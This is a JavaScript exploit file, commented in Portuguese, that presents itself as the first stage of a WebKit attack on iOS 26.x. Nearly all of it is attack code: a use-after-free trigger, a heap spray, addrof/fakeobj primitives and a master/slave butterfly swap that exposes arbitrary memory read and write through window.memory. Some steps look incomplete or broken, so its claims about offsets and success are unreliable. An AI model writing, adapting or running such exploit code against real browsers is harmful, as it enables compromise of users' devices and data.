/**
 * FULL EXPLOIT STAGE 1: WebKit Universal RW
 * Alvo: iOS 26.x (arm64/arm64e)
 * Técnica: UAF -> AddrOf/FakeObj -> Master/Slave Butterfly
 */

const _convBuf = new ArrayBuffer(8);
const _u64 = new BigUint64Array(_convBuf);
const _f64 = new Float64Array(_convBuf);

function itof(val) { _u64[0] = BigInt(val); return _f64[0]; }
function ftoi(f) { _f64[0] = f; return _u64[0]; }

const CONFIG = {
    ARRAY_SIZE: 0x400000,
    ALLOC_SIZE: 0x800000,
    JIT_WARMUP: 200,
    MAX_ATTEMPTS: 100,
    SPRAY_PER_ATTEMPT: 32
};

let uafArray = new Array(CONFIG.ARRAY_SIZE).fill(1.1);
const uafArrayIndex = uafArray.length - 1;

// 1. Gatilho do Use-After-Free
function triggerUAF(k, allocCount) {
    let A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    uafArray[uafArrayIndex] = A;

    let u8 = new Uint8Array(0x100);
    u8[0] = 0x42; // Marker para o Reclaim

    let forGC = [];
    for (let j = 0; j < allocCount; ++j) forGC.push(new ArrayBuffer(CONFIG.ALLOC_SIZE));
    A.p2 = forGC;

    let b = { p0: 0x42424242, p1: u8 };
    A.p1 = b;

    // Loop de delay para confundir o JIT
    let v = 1.1;
    for (let i = 0; i < 500000; ++i) { for (let j = 0; j < k; ++j) v = i; }
    
    u8 = null; // Libera a referência para o GC
}

// 2. Spray de memória para Reclaim
function createSprayArray() {
    let spray = [];
    for (let i = 0; i < 100; i++) {
        let obj = { a: 1.1, b: 2.2 };
        obj['p' + i] = 13.37;
        spray.push(obj);
    }
    return spray;
}

// 3. Setup das Primitivas AddrOf/FakeObj e Universal RW
async function pwn(freedU8, reclaimedArray) {
    console.log("[+] Iniciando escalada universal...");

    const id = {
        addrof: (obj) => {
            reclaimedArray[0] = obj;
            let addr = 0n;
            for (let i = 0; i < 6; i++) addr |= BigInt(freedU8[i]) << BigInt(i * 8);
            return addr;
        },
        fakeobj: (addr) => {
            let a = BigInt(addr);
            for (let i = 0; i < 6; i++) freedU8[i] = Number((a >> BigInt(i * 8)) & 0xffn);
            return reclaimedArray[0];
        }
    };

    let master = [1.1, 2.2];
    let slave = [3.3, 4.4];

    let addrMaster = id.addrof(master);
    let addrSlave = id.addrof(slave);

    // Sobrescreve o Butterfly do Master para apontar para o Butterfly do Slave
    // No iOS 26, o offset do Butterfly em JSArray é +8 bytes
    let masterButt = addrMaster + 8n;
    let slaveButt = addrSlave + 8n;

    // Primitiva de escrita local para o swap
    for (let i = 0; i < 8; i++) {
        freedU8[8 + i] = Number((slaveButt >> BigInt(i * 8)) & 0xffn);
    }

    // INTERFACE FINAL
    window.memory = {
        read64: (addr) => {
            master[1] = itof(BigInt(addr)); // Altera o ponteiro do slave
            return ftoi(slave[0]);
        },
        write64: (addr, val) => {
            master[1] = itof(BigInt(addr));
            slave[0] = itof(BigInt(val));
        },
        addrof: id.addrof,
        fakeobj: id.fakeobj
    };

    console.log("[[[ SUCCESS ]]] window.memory.read64/write64 disponível.");
}

// 4. Main Execution
async function run() {
    console.log("[*] Aquecendo JIT...");
    for (let i = 0; i < CONFIG.JIT_WARMUP; i++) triggerUAF(1, 0);

    for (let attempt = 0; attempt < CONFIG.MAX_ATTEMPTS; attempt++) {
        triggerUAF(5, (attempt % 3) + 1);
        
        let freed = null;
        try { freed = uafArray[uafArrayIndex].p1.p1; } catch(e) { continue; }

        if (freed instanceof Uint8Array && freed[0] === 0x42) {
            console.log(`[!] UAF estável na tentativa ${attempt}`);
            let reclaimed = createSprayArray();
            await pwn(freed, reclaimed);
            break;
        }
    }
}

run();
